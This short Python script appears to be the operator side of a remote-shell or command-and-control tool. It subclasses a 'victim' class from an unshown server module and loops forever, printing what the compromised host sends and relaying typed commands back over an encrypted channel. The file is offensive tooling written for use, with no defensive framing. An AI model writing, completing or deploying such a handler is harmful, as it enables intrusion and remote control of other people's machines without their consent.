#!/usr/bin/env python3
import server as server; 
import string;
import sys

class victim_payload(server.victim):
    def __init__(self):
        super().__init__()


    def payload(self):
        while(True):
            print("".join(filter(lambda x: x in string.printable, str(self.secure_recv(),'ISO-8859-1'))),end="")
            Command = input();
            print (Command +"\n")
            self.secure_send(Command.encode("utf8"),len(Command))

v = victim_payload();
v.payload()

